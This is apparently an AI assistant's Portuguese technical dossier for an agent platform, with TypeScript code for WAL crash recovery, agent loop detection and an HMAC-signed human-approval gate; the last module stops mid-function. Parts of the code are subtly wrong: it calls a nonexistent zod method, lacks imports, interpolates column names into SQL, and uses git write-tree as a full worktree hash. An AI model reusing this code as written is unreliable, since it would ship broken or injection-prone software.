Vou disparar todas as buscas técnicas simultaneamente para máxima profundidade.Todas as buscas concluídas. Compilando agora o **Dossiê de Implementação v2.3** completo, com contratos de função e lógica de reconciliação prontos para ingestão no NotebookLM.

---

# 📁 DOSSIÊ DE IMPLEMENTAÇÃO v2.3
## GreenForge NEXUS — Blueprints de Engenharia para Imunidade Arquitetural

> **Formato:** Contratos de função + lógica de reconciliação + pseudocódigo TypeScript pronto para ingestão.

---

## 📌 MÓDULO 1 — BootReconciler: Algoritmo Exato de Recuperação Pós-SIGKILL

### 1.1 — Fundação Teórica do WAL para Filesystem

O princípio que governa o BootReconciler é direto: um write-ahead log segue um princípio básico — antes de aplicar qualquer mudança ao data store principal, o sistema escreve as mudanças em um log append-only, que serve como um registro sequencial e persistente de cada operação.

A consequência para recuperação de crash é: no núcleo, todos os sistemas seguem a mesma regra: **log primeiro, aplicar depois**. Isso garante que não importa o que ocorra — crashes, falhas ou atrasos — os sistemas podem se recuperar, replicar e manter seu estado intacto. Seja replaying mudanças após um crash, distribuindo eventos para consumidores ou sincronizando dados em um cluster, o log torna isso possível.

Para o SQLite especificamente: no WAL mode, mudanças ao banco de dados são primeiro escritas em um arquivo WAL separado, não diretamente no arquivo de banco. O WAL mode requer ajuste cuidadoso da frequência de checkpoints para balancear entre performance e uso de disco. A operação de checkpoint, que mescla mudanças do WAL file para o arquivo principal do banco, é crucial para controlar o tamanho do WAL file e garantir que os dados sejam permanentemente escritos.

A limitação crítica do SQLite multi-database que torna o Intent Log **obrigatório**: transações que envolvem mudanças contra múltiplos databases `ATTACH`ed são atômicas para cada database individual, **mas não são atômicas através de todos os databases como um conjunto**.

Aplicado ao WAL mode do SQLite em Node.js: ativar o Write-Ahead Logging é recomendado para a maioria das aplicações: `db.pragma('journal_mode = WAL')` — isso garante melhor performance de leitura concorrente.

### 1.2 — Mecânica do Commit Atômico no Filesystem

Para a escrita atômica no Intent Log (o arquivo `.json` de intenção): o processo correto é: escrever mudanças no arquivo de banco com `write(2)` e copiar versões antigas das páginas para o journal, então executar `fsync(2)` no arquivo e desvincular o journal file.

A atomicidade via `rename` é a técnica padrão: um COMMIT ocorre quando um registro especial indicando commit é appendado ao WAL. Assim, um COMMIT pode acontecer sem nunca escrever no database original, o que permite que leitores continuem operando a partir do banco inalterado enquanto mudanças estão sendo commitadas no WAL simultaneamente.

### 1.3 — O Algoritmo Completo do BootReconciler

```typescript
// ============================================================
// boot-reconciler.ts
// CONTRATO: Deve ser a PRIMEIRA função chamada no startup do
// GreenForge, antes de qualquer operação Git ou DB.
// ============================================================
import fs from 'fs';
import path from 'path';
import { execFileSync } from 'child_process';
import Database from 'better-sqlite3';

// --- TIPOS E CONSTANTES ---

type IntentPhase =
  | 'INTENT_WRITTEN'   // Fase 0: Log escrito, NADA executado
  | 'GIT_STASH_DONE'  // Fase 1: Git stash concluído, DB não
  | 'DB_COMMITTED'     // Fase 2: DB concluído → estado FINAL OK
  | 'ROLLED_BACK';     // Estado terminal de abort

interface CheckpointIntent {
  txId: string;
  agentId: string;
  worktreePath: string;
  stashMessage: string;
  dbPayload: { column: string; value: string; agentId: string };
  phase: IntentPhase;
  stashRef: string | null;
  createdAt: number;
}

// O diretório WAL é o "cérebro" da reconciliação.
// Cada transação em voo tem exatamente 1 arquivo aqui.
const WAL_DIR = path.resolve(process.cwd(), '.greenforge', 'wal');

// --- UTILITÁRIOS DE PERSISTÊNCIA ---

/**
 * CONTRATO writeIntent():
 * - INPUT:  CheckpointIntent (qualquer fase)
 * - OUTPUT: void (ou lança se fsync falhar)
 * - GARANTIA: Operação atômica via temp + fsync + rename POSIX
 *   → Sobrevive a SIGKILL entre write e rename (arquivo .tmp fica)
 *   → O BootRecoverer detecta .tmp files como evidência de crash
 */
function writeIntent(intent: CheckpointIntent): void {
  fs.mkdirSync(WAL_DIR, { recursive: true });

  const targetPath = path.join(WAL_DIR, `${intent.txId}.json`);
  const tempPath   = `${targetPath}.tmp`;

  // Passo 1: Escreve no temporário
  fs.writeFileSync(tempPath, JSON.stringify(intent, null, 2), 'utf8');

  // Passo 2: fsync ANTES do rename (garante durabilidade no disco)
  const fd = fs.openSync(tempPath, 'r+');
  fs.fsyncSync(fd);
  fs.closeSync(fd);

  // Passo 3: Rename atômico (operação POSIX — indivisível)
  fs.renameSync(tempPath, targetPath);
}

function readAllPendingIntents(): CheckpointIntent[] {
  if (!fs.existsSync(WAL_DIR)) return [];
  return fs.readdirSync(WAL_DIR)
    .filter(f => f.endsWith('.json'))
    .map(f => {
      try {
        return JSON.parse(fs.readFileSync(path.join(WAL_DIR, f), 'utf8')) as CheckpointIntent;
      } catch {
        return null;
      }
    })
    .filter((x): x is CheckpointIntent => x !== null);
}

function cleanIntent(txId: string): void {
  const p = path.join(WAL_DIR, `${txId}.json`);
  if (fs.existsSync(p)) fs.unlinkSync(p);
}

// Detecta arquivos .tmp (evidência de SIGKILL durante o próprio writeIntent)
function cleanOrphanedTempFiles(): void {
  if (!fs.existsSync(WAL_DIR)) return;
  fs.readdirSync(WAL_DIR)
    .filter(f => f.endsWith('.tmp'))
    .forEach(f => {
      console.warn(`[BOOT] Removing orphaned temp WAL file: ${f}`);
      fs.unlinkSync(path.join(WAL_DIR, f));
    });
}

// --- O BOOT RECONCILER ---

/**
 * CONTRATO bootReconciler():
 * - INPUT:  Instância do banco SQLite já aberto com WAL mode
 * - OUTPUT: ReconciliationReport (summary das ações tomadas)
 * - EFEITOS: Resolve TODOS os intents pendentes encontrados no WAL_DIR
 *
 * LÓGICA DE DECISÃO (máquina de estados determinística):
 *
 *   INTENT_WRITTEN  →  NADA foi executado
 *                      AÇÃO: Marcar ROLLED_BACK + limpar arquivo
 *                      RAZÃO: Estado seguro, abort limpo
 *
 *   GIT_STASH_DONE  →  Git fez stash, DB NUNCA foi atualizado
 *                      AÇÃO: Re-drive DB update (idempotente) → DB_COMMITTED
 *                      RAZÃO: Forward recovery — o stash já existe, completar
 *
 *   DB_COMMITTED    →  Estado terminal de sucesso (arquivo residual)
 *                      AÇÃO: Apenas limpar o arquivo do WAL
 *                      RAZÃO: Transação já completa
 *
 *   ROLLED_BACK     →  Estado terminal de abort (arquivo residual)
 *                      AÇÃO: Apenas limpar o arquivo do WAL
 *                      RAZÃO: Transação já abortada
 */
interface ReconciliationReport {
  totalFound: number;
  rolledBack: string[];
  forwardRecovered: string[];
  cleaned: string[];
  errors: { txId: string; error: string }[];
}

export function bootReconciler(db: Database.Database): ReconciliationReport {
  const report: ReconciliationReport = {
    totalFound: 0,
    rolledBack: [],
    forwardRecovered: [],
    cleaned: [],
    errors: [],
  };

  // Limpeza preliminar de temp files (crash durante writeIntent)
  cleanOrphanedTempFiles();

  const intents = readAllPendingIntents();
  report.totalFound = intents.length;

  if (intents.length === 0) {
    console.log('[BOOT] No pending intents. Clean startup. ✅');
    return report;
  }

  console.warn(`[BOOT] Found ${intents.length} pending intent(s). Starting reconciliation...`);

  for (const intent of intents) {
    try {
      switch (intent.phase) {

        // ─────────────────────────────────────────────────────────
        // CASO 1: SIGKILL aconteceu ANTES de qualquer side-effect
        // O Intent Log foi escrito mas git stash NUNCA foi executado
        // DECISÃO: Abort limpo (nada a desfazer)
        // ─────────────────────────────────────────────────────────
        case 'INTENT_WRITTEN': {
          console.warn(`[RECOVERY:ROLLBACK] ${intent.txId} — Git never ran. Clean abort.`);
          // Marcar como rolled back (não apenas deletar — auditoria)
          writeIntent({ ...intent, phase: 'ROLLED_BACK' });
          cleanIntent(intent.txId);
          report.rolledBack.push(intent.txId);
          break;
        }

        // ─────────────────────────────────────────────────────────
        // CASO 2: SIGKILL aconteceu ENTRE git stash push e DB update
        // O stash EXISTE no git mas o DB NUNCA foi atualizado
        // DECISÃO: Forward recovery — completar a transação
        // ─────────────────────────────────────────────────────────
        case 'GIT_STASH_DONE': {
          console.warn(`[RECOVERY:FORWARD] ${intent.txId} — Git done, DB not. Re-driving DB.`);

          // Verificar se o stash ainda existe (idempotência)
          const stashList = execFileSync('git', [
            '-C', intent.worktreePath, 'stash', 'list'
          ]).toString();

          if (!stashList.includes(intent.stashMessage)) {
            // Stash desapareceu (pop manual?) → Rollback do DB também não é necessário
            console.warn(`[RECOVERY:FORWARD] Stash ref not found. Treating as clean state.`);
            writeIntent({ ...intent, phase: 'ROLLED_BACK' });
            cleanIntent(intent.txId);
            report.rolledBack.push(intent.txId);
            break;
          }

          // Re-drive do DB update (operação IDEMPOTENTE via WHERE)
          db.transaction(() => {
            db.prepare(`
              UPDATE agents
              SET    ${intent.dbPayload.column} = ?,
                     updatedAt                  = ?
              WHERE  id = ?
            `).run(intent.dbPayload.value, Date.now(), intent.dbPayload.agentId);
          })();

          // Marcar como completamente committed
          writeIntent({ ...intent, phase: 'DB_COMMITTED' });
          cleanIntent(intent.txId);
          report.forwardRecovered.push(intent.txId);
          console.log(`[RECOVERY:FORWARD] ✅ Forward recovery complete: ${intent.txId}`);
          break;
        }

        // ─────────────────────────────────────────────────────────
        // CASOS TERMINAIS: Arquivos residuais de transações completas
        // DECISÃO: Apenas limpar o arquivo WAL
        // ─────────────────────────────────────────────────────────
        case 'DB_COMMITTED':
        case 'ROLLED_BACK': {
          console.log(`[BOOT] Cleaning terminal intent: ${intent.txId} (${intent.phase})`);
          cleanIntent(intent.txId);
          report.cleaned.push(intent.txId);
          break;
        }
      }
    } catch (err) {
      const errorMsg = err instanceof Error ? err.message : String(err);
      console.error(`[RECOVERY:ERROR] Failed to reconcile ${intent.txId}: ${errorMsg}`);
      report.errors.push({ txId: intent.txId, error: errorMsg });
    }
  }

  return report;
}

// --- FUNÇÕES DO CHECKPOINT (usado durante operação normal) ---

/**
 * CONTRATO: beginCheckpoint()
 * Fase 0 — Escreve intenção ANTES de qualquer side-effect
 */
export async function beginCheckpoint(
  agentId: string,
  worktreePath: string,
  dbPayload: { column: string; value: string; agentId: string }
): Promise<CheckpointIntent> {
  const intent: CheckpointIntent = {
    txId: crypto.randomUUID(),
    agentId,
    worktreePath,
    stashMessage: `gf-ckpt-${agentId}-${Date.now()}`,
    dbPayload,
    phase: 'INTENT_WRITTEN',
    stashRef: null,
    createdAt: Date.now(),
  };
  writeIntent(intent); // WAL escrito ANTES de qualquer ação
  return intent;
}

/**
 * CONTRATO: executeGitPhase()
 * Fase 1 — Executa git stash e atualiza WAL com stash ref
 */
export function executeGitPhase(intent: CheckpointIntent): CheckpointIntent {
  execFileSync('git', [
    '-C', intent.worktreePath,
    'stash', 'push', '-m', intent.stashMessage, '--include-untracked'
  ]);

  const stashRef = execFileSync('git', [
    '-C', intent.worktreePath, 'stash', 'list', '--format=%gd %gs'
  ]).toString()
    .split('\n')
    .find(l => l.includes(intent.stashMessage))
    ?.split(' ')[0] ?? 'stash@{0}';

  const updated = { ...intent, phase: 'GIT_STASH_DONE' as IntentPhase, stashRef };
  writeIntent(updated); // Registra que Git foi feito
  return updated;
}

/**
 * CONTRATO: executeDBPhase()
 * Fase 2 — Atualiza DB e finaliza a transação
 */
export function executeDBPhase(
  db: Database.Database,
  intent: CheckpointIntent
): CheckpointIntent {
  db.transaction(() => {
    db.prepare(`
      UPDATE agents SET ${intent.dbPayload.column} = ?, updatedAt = ?
      WHERE id = ?
    `).run(intent.dbPayload.value, Date.now(), intent.dbPayload.agentId);
  })();

  const committed = { ...intent, phase: 'DB_COMMITTED' as IntentPhase };
  writeIntent(committed);
  cleanIntent(intent.txId); // Transação completa → limpar WAL
  return committed;
}
```

---

## 📌 MÓDULO 2 — CPG Stack para TypeScript/JS: Program Dependence Graph em Runtime

### 2.1 — A Estrutura Formal do CPG

Em ciência da computação, um Code Property Graph (CPG) é uma representação de programa que captura estrutura sintática, fluxo de controle e dependências de dados em um property graph.

Um CPG de um programa é uma representação em grafo obtida pela fusão de suas Abstract Syntax Trees (AST), Control-Flow Graphs (CFG) e Program Dependence Graphs (PDG) em nós de statement e predicate.

O PDG, a camada mais semântica: o Program Dependence Graph (PDG) é um grafo que abrange tanto as dependências de dados quanto as dependências de controle dentro do programa. Isso é interessante pois permite determinar quais nós têm algum tipo de efeito em outro nó, seja por fluxo de dados direto ou por impacto na execução de uma aresta ou valor potencial. Ele apresenta uma boa forma de realizar *program slicing* e tem sido usado em otimização de programas. Em particular, o PDG também é adequado para identificar fluxos implícitos de dados.

Para detecção de loops semânticos, a propriedade matemática mais importante: para código bem estruturado, PDGs possuem a propriedade determinística: toda execução, independentemente da ordem de seleção de nós, produz um estado final único. Isso é formalizado por um conjunto de restrições sobre arestas de controle/dados/def-order garantindo confluência. O **teorema de equivalência** estabelece que, para PDGs determinísticos (abrangendo aqueles construídos de código estruturado if/while/sequence/ret), a semântica do PDG coincide com a do CFG original: qualquer execução terminante produz o mesmo mapeamento de variáveis na saída do programa.

### 2.2 — Ferramenta de Referência: Fraunhofer AISEC CPG

A descoberta mais relevante para o stack TypeScript do GreenForge é: o projeto Joern fornece geradores de CPG para C/C++, Java, Java bytecode, Kotlin, Python, **JavaScript**, **TypeScript**, LLVM bitcode, e binários x86.

O projeto do Fraunhofer AISEC expande isso: uma biblioteca simples para extrair um code property graph do código-fonte. Possui suporte para múltiplos passes que podem estender a análise após o grafo ser construído. Atualmente suporta C/C++ (C17), Java (Java 13) e tem **suporte experimental para Golang, Python e TypeScript**. Além disso, tem suporte para LLVM IR e, portanto, teoricamente suporta todas as linguagens que compilam usando LLVM.

A query API do CPG para análise de dependências: um CPG permite que analistas e ferramentas automatizadas façam perguntas complexas sobre o código que nenhuma representação isolada consegue responder — como "mostre-me cada caminho onde input do usuário alcança uma query de banco sem passar por um sanitizador."

### 2.3 — Implementação: Execution Oracle + CPG Lightweight

```typescript
// ============================================================
// cpg-loop-detector.ts
// CONTRATO: Detecta loops semânticos em agentes LLM
// usando CPG lightweight + Execution Oracle como árbitro.
//
// ARQUITETURA (baseada no paper TAILOR, ASE'22):
//   CPG = AST + CFG + DFG (fusão de 3 representações)
//   Detecção: sideEffectHash (oracle) > CPG similarity > cycle
// ============================================================
import crypto from 'crypto';
import { execFileSync } from 'child_process';
import * as fs from 'fs';

// --- TIPOS ---

/**
 * Vetor CPG lightweight:
 * Combina frequência de node-types (AST) + arestas de fluxo (DFG)
 * + profundidade de controle (CFG) + hash de efeito colateral (Oracle)
 */
interface CPGVector {
  // AST Layer: frequência de tipos de nó (paradigm-shift proof)
  nodeTypeFreq: Record<string, number>;
  // CFG Layer: profundidade máxima de aninhamento de controle
  controlDepth: number;
  // DFG Layer: estimativa de arestas de fluxo de dados
  dataFlowEdges: number;
  // Oracle Layer: hash normalizado dos efeitos colaterais observados
  sideEffectHash: string;
}

interface AgentSnapshot {
  roundIndex: number;
  worktreeHash: string;         // SHA256 multi-arquivo
  cpgVector: CPGVector;
  modifiedFiles: string[];
  timestamp: number;
}

interface LoopDiagnosis {
  isLoop: true;
  type: 'INVARIANT_SIDE_EFFECTS' | 'CPG_CYCLE';
  cycleLength?: number;
  invariantHash?: string;
  affectedFiles: string[];
  recommendation: string;
}

interface NoLoop {
  isLoop: false;
}

// --- EXTRATOR DE CPG LIGHTWEIGHT ---

/**
 * CONTRATO: extractCPGVector()
 * - INPUT:  source code (TypeScript/JS) + test output normalizado
 * - OUTPUT: CPGVector com as 4 camadas
 *
 * Baseado no framework TAILOR (ASE'22):
 *   "extraímos a AST de um fragmento de código e identificamos
 *    dependências de controle e dados na AST para construir o CFG e DFG.
 *    Então AST, CFG e DFG são combinados em um CPG."
 *
 * Implementação lightweight: Regex-based para evitar overhead
 * de parser completo em cada round de debate.
 */
function extractCPGVector(source: string, testOutput: string): CPGVector {
  // --- CAMADA AST: Frequência de tipos de nó ---
  // Paradigm-shift proof: captura FUNÇÃO, não FORMA
  // if-statement e switch-statement têm frequências diferentes
  // mas o sideEffectHash os iguala quando são equivalentes
  const nodePatterns: Record<string, RegExp> = {
    'if':              /\bif\s*\(/g,
    'switch':          /\bswitch\s*\(/g,
    'for':             /\bfor\s*\(/g,
    'while':           /\bwhile\s*\(/g,
    'arrow_fn':        /=>\s*[{(]/g,
    'function':        /\bfunction\s+\w/g,
    'async':           /\basync\b/g,
    'await':           /\bawait\b/g,
    'return':          /\breturn\b/g,
    'throw':           /\bthrow\b/g,
    'try':             /\btry\s*\{/g,
    'assignment':      /(?<![=!<>])=(?!=)/g,
    'const':           /\bconst\b/g,
    'let':             /\blet\b/g,
  };

  const nodeTypeFreq: Record<string, number> = {};
  for (const [type, pattern] of Object.entries(nodePatterns)) {
    nodeTypeFreq[type] = (source.match(pattern) ?? []).length;
  }

  // --- CAMADA CFG: Profundidade de controle ---
  const lines = source.split('\n');
  const controlDepth = Math.max(
    0,
    ...lines.map(l => Math.floor((l.match(/^\s+/)?.[0].length ?? 0) / 2))
  );

  // --- CAMADA DFG: Estimativa de arestas ---
  const declarations = (source.match(/\b(?:const|let|var)\s+\w+/g) ?? []).length;
  const identifiers  = (source.match(/\b[a-z_][a-zA-Z0-9_]{1,}\b/g) ?? []).length;
  const dataFlowEdges = Math.max(0, identifiers - declarations);

  // --- ORACLE: Hash de efeito colateral normalizado ---
  // Normalização: remove variações que não afetam semântica
  // (duração de testes, timestamps, UUIDs, etc.)
  const normalized = testOutput
    .replace(/\d+\s*ms/gi, 'Xms')
    .replace(/\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b/gi, 'UUID')
    .replace(/\d{4}-\d{2}-\d{2}T[\d:.Z]+/g, 'TIMESTAMP')
    .replace(/\s+/g, ' ')
    .trim();

  const sideEffectHash = crypto
    .createHash('sha256')
    .update(normalized)
    .digest('hex')
    .substring(0, 20);

  return { nodeTypeFreq, controlDepth, dataFlowEdges, sideEffectHash };
}

// --- SIMILARIDADE SEMÂNTICA ENTRE VETORES CPG ---

/**
 * CONTRATO: computeCPGSimilarity()
 * - INPUT:  Dois CPGVectors
 * - OUTPUT: Score [0.0 - 1.0] (1.0 = semanticamente idênticos)
 *
 * Pesos (baseados na importância semântica):
 *   Oracle (sideEffect):  60% — se os testes passam igual, são equivalentes
 *   Node types (AST):     30% — mesmo conjunto de constructs
 *   Control depth (CFG):  10% — proxy de complexidade de fluxo
 */
function computeCPGSimilarity(a: CPGVector, b: CPGVector): number {
  const oracleScore = a.sideEffectHash === b.sideEffectHash ? 1.0 : 0.0;

  const allTypes = new Set([...Object.keys(a.nodeTypeFreq), ...Object.keys(b.nodeTypeFreq)]);
  let typeScore = 0;
  for (const t of allTypes) {
    const fa = a.nodeTypeFreq[t] ?? 0;
    const fb = b.nodeTypeFreq[t] ?? 0;
    const max = Math.max(fa, fb);
    if (max > 0) typeScore += 1 - Math.abs(fa - fb) / max;
  }
  typeScore = allTypes.size > 0 ? typeScore / allTypes.size : 1.0;

  const maxDepth = Math.max(a.controlDepth, b.controlDepth);
  const depthScore = maxDepth > 0
    ? 1 - Math.abs(a.controlDepth - b.controlDepth) / maxDepth
    : 1.0;

  return (oracleScore * 0.6) + (typeScore * 0.3) + (depthScore * 0.1);
}

// --- O DETECTOR ---

export class CPGLoopDetector {
  private history: AgentSnapshot[] = [];
  private readonly WINDOW_SIZE     = 6;
  private readonly SIMILARITY_THR  = 0.85;
  private readonly MIN_ROUNDS      = 3;

  /**
   * CONTRATO: detectLoop()
   * - INPUT:  worktreePath + testOutput bruto
   * - OUTPUT: LoopDiagnosis | NoLoop
   *
   * DOIS CRITÉRIOS (em ordem de prioridade):
   *
   * 1. INVARIANT_SIDE_EFFECTS:
   *    O hash do output dos testes não mudou por MIN_ROUNDS rounds.
   *    Paradigm-shift proof: não compara sintaxe, compara CONSEQUÊNCIAS.
   *    "Se o agente muda o código mas o resultado do teste é o mesmo,
   *     ele está em loop."
   *
   * 2. CPG_CYCLE:
   *    Os CPGVectors formam um ciclo de comprimento N.
   *    Detecta loops do Tipo 4 (semântico) mesmo com mudanças de paradigma.
   */
  detectLoop(worktreePath: string, testOutput: string): LoopDiagnosis | NoLoop {
    const diffOutput = execFileSync('git', [
      '-C', worktreePath, 'diff', '--name-only', 'HEAD'
    ]).toString().trim();
    const modifiedFiles = diffOutput.split('\n').filter(Boolean);

    let combinedSource = '';
    for (const file of modifiedFiles) {
      const full = path.join(worktreePath, file);
      if (fs.existsSync(full)) combinedSource += fs.readFileSync(full, 'utf8');
    }

    const cpgVector = extractCPGVector(combinedSource, testOutput);
    const worktreeHash = crypto
      .createHash('sha256')
      .update(combinedSource)
      .digest('hex')
      .substring(0, 16);

    const snap: AgentSnapshot = {
      roundIndex: this.history.length,
      worktreeHash,
      cpgVector,
      modifiedFiles,
      timestamp: Date.now(),
    };

    this.history.push(snap);
    if (this.history.length > this.WINDOW_SIZE * 2) this.history.shift();

    const recent = this.history.slice(-this.WINDOW_SIZE);
    if (recent.length < this.MIN_ROUNDS) return { isLoop: false };

    // ── CRITÉRIO 1: Invariância de efeitos colaterais ──
    const sideEffectHashes = new Set(recent.map(s => s.cpgVector.sideEffectHash));
    if (sideEffectHashes.size === 1) {
      return {
        isLoop: true,
        type: 'INVARIANT_SIDE_EFFECTS',
        invariantHash: [...sideEffectHashes][0],
        affectedFiles: [...new Set(recent.flatMap(s => s.modifiedFiles))],
        recommendation: `Agent has been modifying code for ${recent.length} rounds without changing test outcomes. Likely semantic loop. Suggest: inject new constraint or escalate to human review.`,
      };
    }

    // ── CRITÉRIO 2: CPG cycle detection ──
    for (let len = 2; len <= Math.floor(recent.length / 2); len++) {
      let isCycle = true;
      for (let i = 0; i + len < recent.length; i++) {
        const sim = computeCPGSimilarity(recent[i].cpgVector, recent[i + len].cpgVector);
        if (sim < this.SIMILARITY_THR) { isCycle = false; break; }
      }
      if (isCycle) {
        return {
          isLoop: true,
          type: 'CPG_CYCLE',
          cycleLength: len,
          affectedFiles: [...new Set(recent.flatMap(s => s.modifiedFiles))],
          recommendation: `CPG cycle of length ${len} detected (semantic similarity >${this.SIMILARITY_THR}). Paradigm shift (if→switch etc.) identified as equivalent loop. Force new approach or abort.`,
        };
      }
    }

    return { isLoop: false };
  }

  reset(): void { this.history = []; }
}
```

> 🔑 **Nota arquitetural:** Para escala de produção, substitua o extrator regex pelo **Fraunhofer AISEC/CPG** (JVM via child_process), que possui suporte experimental nativo para TypeScript e provê um modelo estrutural e semântico completo do código-fonte que suporta análise avançada de segurança, descoberta de vulnerabilidades e compreensão de código.

---

## 📌 MÓDULO 3 — Pre-Execution Guard: OCC + HMAC + Worktree Hash Fencing

### 3.1 — Mecânica do OCC com Version Token

Transações OCC envolvem estas fases: **Begin** — registrar um timestamp marcando o início da transação. **Modify** — ler valores do banco e tentativamente escrever mudanças. **Validate** — verificar se outras transações modificaram dados que esta transação usou (lidos ou escritos), incluindo transações que completaram após o tempo de início desta. **Commit/Rollback** — se não há conflito, fazer todas as mudanças ter efeito; se há conflito, resolvê-lo, tipicamente abortando a transação. **Deve-se ter cuidado para evitar um bug de time-of-check to time-of-use**, particularmente se esta fase e a anterior não são executadas como uma única operação atômica.

Para o SQLite especificamente: esta estratégia é útil em bancos de dados como SQLite, que **carecem de suporte nativo para auto-updating row versions**, e também provê controle mais fino em databases como SQL Server, permitindo que desenvolvedores decidam exatamente quando e como o token deve ser atualizado.

O padrão ETag do Dapr como referência para o token: o OCC assume que conflitos são raros e os verifica apenas no momento da escrita. O Dapr implementa OCC através de ETags: um version token retornado com cada leitura de estado. O fluxo: ler estado para obter o ETag atual, incluí-lo na requisição de escrita com `concurrency: first-write`, e tratar respostas 409 Conflict com um loop de read-retry. Isso previne lost updates sem o overhead de distributed locks.

### 3.2 — O Pre-Execution Guard: Worktree Hash como Epoch Fence

O conceito-chave adicionado à v2.3 que **não existia** na v2.2.1: o Worktree Hash captura o estado completo do diretório no momento da proposta. No momento da aprovação, se o hash divergiu (agente continuou executando durante a queda do servidor), o gate é invalidado. Esta é a "segunda camada" além do version counter do OCC.

### 3.3 — Implementação Completa

```typescript
// ============================================================
// pre-execution-guard.ts
// CONTRATO: Gate HITL com OCC + HMAC + Worktree Hash Fencing
//
// TRÊS CAMADAS DE DEFESA:
//   1. TTL: O card expirou temporalmente?
//   2. HMAC: O card foi forjado ou adulterado?
//   3. OCC Version: O recurso DB foi modificado? (Stale Approval)
//   4. Worktree Hash: O filesystem divergiu? (Pre-Execution Guard)
// ============================================================
import crypto from 'crypto';
import { execFileSync } from 'child_process';
import * as fs from 'fs';
import Database from 'better-sqlite3';
import { z } from 'zod';

// --- SCHEMA DO APPROVAL CARD ---

const ApprovalCardSchema = z.object({
  cardId:          z.string().uuid(),
  agentId:         z.string().min(1),
  proposedAction:  z.string().max(1024),
  resourceVersion: z.number().int().nonneg(),  // OCC epoch snapshot
  worktreeHash:    z.string().length(64),       // SHA256 do worktree no momento da proposta
  worktreePath:    z.string().min(1),
  issuedAt:        z.number(),
  ttlMs:           z.number().default(5 * 60 * 1000),
  hmac:            z.string().min(32),          // Autenticidade do card
});

export type ApprovalCard = z.infer<typeof ApprovalCardSchema>;

export type GateResult =
  | { ok: true;  newVersion: number; message: string }
  | { ok: false; reason: 'TTL_EXPIRED' | 'HMAC_INVALID' | 'VERSION_CONFLICT'
                       | 'WORKTREE_DIVERGED' | 'RESOURCE_NOT_FOUND' | 'RACE_CONDITION';
      detail: string };

interface AgentResource {
  id:             string;
  currentVersion: number;
  state:          string;
  lastModifiedAt: number;
}

const HMAC_SECRET = process.env.GREENFORGE_GATE_SECRET ?? (() => {
  throw new Error('[SECURITY] GREENFORGE_GATE_SECRET env var is required in production.');
})();

// --- UTILITÁRIOS ---

/**
 * CONTRATO: computeWorktreeHash()
 * - INPUT:  Caminho do worktree
 * - OUTPUT: SHA256 do estado completo do diretório
 *
 * Captura: hash de todos os arquivos rastreados pelo git
 * Isso é o "Epoch Fence" — qualquer mudança no worktree
 * (mesmo de 1 byte) invalida o Approval Card.
 */
function computeWorktreeHash(worktreePath: string): string {
  // Usa git hash-object para capturar estado de todos os arquivos rastreados
  // Idempotente e determinístico
  const treeHash = execFileSync('git', [
    '-C', worktreePath, 'write-tree'
  ]).toString().trim();

  return crypto
    .createHash('sha256')
    .update(treeHash)
    .digest('hex');
}

function computeHMAC(card: Omit<ApprovalCard, 'hmac'>): string {
  const payload = [
    card.cardId,
    card.agentId,
    card.proposedAction,
    card.resourceVersion.toString(),
    card.worktreeHash,
    card.issuedAt.toString(),
  ].join(':');

  return crypto
    .createHmac('sha256', HMAC_SECRET)
    .update(payload)
    .digest('hex');
}

// --- O PRE-EXECUTION GUARD ---

export class PreExecutionGuard {
  constructor(private db: Database.Database) {
    this.db.pragma('journal_mode = WAL');
    this.initSchema();
  }

  private initSchema(): void {
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS agent_resources (
        id              TEXT    PRIMARY KEY,
        currentVersion  INTEGER NOT NULL DEFAULT 0,
        state           TEXT    NOT NULL,
        lastModifiedAt  INTEGER NOT NULL
      );
    `);
  }

  /**
   * CONTRATO: issueCard()
   * - INPUT:  agentId, proposedAction, worktreePath
   * - OUTPUT: ApprovalCard assinado com HMAC
   *
   * Captura DOIS snapshots no momento da emissão:
   *   1. resourceVersion (OCC) — estado do DB
   *   2. worktreeHash (Epoch Fence) — estado do filesystem
   *
   * Se QUALQUER UM deles divergir no momento da aprovação,
   * o gate é invalidado.
   */
  issueCard(agentId: string, proposedAction: string, worktreePath: string): ApprovalCard {
    const resource = this.db.prepare(
      `SELECT * FROM agent_resources WHERE id = ?`
    ).get(agentId) as AgentResource | undefined;

    if (!resource) throw new Error(`Agent resource not found: ${agentId}`);

    const cardBase: Omit<ApprovalCard, 'hmac'> = {
      cardId:          crypto.randomUUID(),
      agentId,
      proposedAction,
      resourceVersion: resource.currentVersion,        // OCC snapshot
      worktreeHash:    computeWorktreeHash(worktreePath), // Epoch fence snapshot
      worktreePath,
      issuedAt:        Date.now(),
      ttlMs:           5 * 60 * 1000,
    };

    return ApprovalCardSchema.parse({
      ...cardBase,
      hmac: computeHMAC(cardBase),
    });
  }

  /**
   * CONTRATO: submitApproval()
   * - INPUT:  unknown (validação interna via Zod)
   * - OUTPUT: GateResult
   *
   * SEQUÊNCIA DE VALIDAÇÃO (fail-fast, mais barata primeiro):
   *   1. Schema Zod          → HMAC_INVALID se mal formado
   *   2. TTL check           → TTL_EXPIRED
   *   3. HMAC verification   → HMAC_INVALID (card forjado/adulterado)
   *   4. Worktree Hash check → WORKTREE_DIVERGED (filesystem mudou)
   *   5. OCC atomic UPDATE   → VERSION_CONFLICT | RACE_CONDITION
   *
   * A validação 4 (Worktree Hash) é o "Pre-Execution Guard":
   * garante que o filesystem que o usuário aprovou é o MESMO
   * que será executado.
   */
  submitApproval(rawCard: unknown): GateResult {
    // Camada 0: Schema
    const parse = ApprovalCardSchema.safeParse(rawCard);
    if (!parse.success) {
      return { ok: false, reason: 'HMAC_INVALID', detail: `Schema invalid: ${parse.error.message}` };
    }
    const card = parse.data;

    // Camada 1: TTL
    const now = Date.now();
    if (now > card.issuedAt + card.ttlMs) {
      const expiredSecsAgo = Math.round((now - card.issuedAt - card.ttlMs) / 1000);
      return {
        ok: false, reason: 'TTL_EXPIRED',
        detail: `Card expired ${expiredSecsAgo}s ago. Request a fresh card.`,
      };
    }

    // Camada 2: HMAC (integridade + autenticidade)
    const expected = computeHMAC({
      cardId: card.cardId, agentId: card.agentId, proposedAction: card.proposedAction,
      resourceVersion: card.resourceVersion, worktreeHash: card.worktreeHash,
      worktreePath: card.worktreePath, issuedAt: card.issuedAt, ttlMs: card.ttlMs,
    });
    if (!crypto.timingSafeEqual(Buffer.from(card.hmac), Buffer.from(expected))) {
      return { ok: false, reason: 'HMAC_INVALID', detail: 'Card HMAC mismatch. Possible tampering or replay attack.' };
    }

